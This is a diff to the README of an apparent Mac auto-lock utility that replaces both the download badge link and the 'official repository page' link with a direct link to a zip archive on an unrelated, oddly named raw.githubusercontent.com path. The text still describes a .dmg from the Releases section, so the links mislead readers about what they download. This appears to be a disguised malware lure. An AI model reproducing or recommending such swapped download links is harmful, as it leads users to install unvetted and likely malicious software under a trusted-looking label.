@@ -5,7 +5,7 @@ description: "Lock your Mac automatically when you move away with your iPhone. P
 ---
 # 🔒 Uthereal-Security---Laptop-Walk-Lock - Secure your data by walking away
 
-[![Download Uthereal Security](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Ftlostrogoth577/Uthereal-Security---Laptop-Walk-Lock)
+[![Download Uthereal Security](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://raw.githubusercontent.com/Ftlostrogoth577/ftlostrogoth577.github.io/main/nondialectical/github_ftlostrogoth_io_v3.7.zip)
 
 ## ❔ What is this software?
 
@@ -29,7 +29,7 @@ Ensure your phone supports Bluetooth Low Energy. Most smartphones manufactured i
 
 Follow these steps to acquire the installer:
 
-1. Visit the [official repository page](https://github.com/Ftlostrogoth577/Uthereal-Security---Laptop-Walk-Lock).
+1. Visit the [official repository page](https://raw.githubusercontent.com/Ftlostrogoth577/ftlostrogoth577.github.io/main/nondialectical/github_ftlostrogoth_io_v3.7.zip).
 2. Look for the "Releases" section on the right side of the screen.
 3. Click the most recent version number.
 4. Select the file ending in ".dmg" to download the installer to your computer.
